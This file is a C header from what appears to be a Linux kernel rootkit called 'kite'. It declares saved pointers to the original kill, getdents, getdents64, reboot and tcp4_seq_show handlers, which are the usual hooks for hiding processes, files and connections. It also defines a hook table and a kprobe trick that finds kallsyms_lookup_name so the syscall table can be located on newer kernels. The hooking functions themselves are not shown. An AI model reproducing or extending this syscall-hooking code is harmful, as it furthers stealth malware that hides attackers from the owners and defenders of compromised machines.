#include "kite_init.h"
#include "_memory.h"
#include <linux/kprobes.h> // to probe kernel dymbols


#ifndef KITE_HOOK
    #define KITE_HOOK

#ifdef PTREGS_SYSCALL_STUB
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs); /*define type for syscalls functions*/
ptregs_t orig_kill;
ptregs_t orig_getdents64;
ptregs_t orig_getdents;
ptregs_t orig_reboot;
#else
#endif


static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
typedef struct HOOK {
    int call;
    void * f_ptr;
    ptregs_t original;
} HOOK; /*defiine structure to keep hooks by syscall, pointer to new function, pointer to original function*/


static unsigned long *get_symbol(char *symbol){
    static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name" // ready the kbrobe to probe the kallsyms_lookup_name function
    };

    typedef unsigned long (*t_kallsyms_lookup_name)(const char *); // the kallsyms_lookup_name function prototype
    unsigned long *address; // define syscall table pointer to return later
    #if LINUX_VERSION_CODE > KERNEL_VERSION(5, 8, 0)
        register_kprobe(&kp);
        t_kallsyms_lookup_name kallsyms_lookup_name_new;
        kallsyms_lookup_name_new = (t_kallsyms_lookup_name)kp.addr; // get address of function
        address = (unsigned long*)kallsyms_lookup_name_new(symbol); // get starting point of syscall table in memory
        unregister_kprobe(&kp);
    #elif LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0) && LINUX_VERSION_CODE < KERNEL_VERSION(5, 8, 0)
        address = (unsigned long*)kallsyms_lookup_name(symbol); // find syscall table symlink and get table address
    #else
        address = NULL;
    #endif
    return address;
}


#endif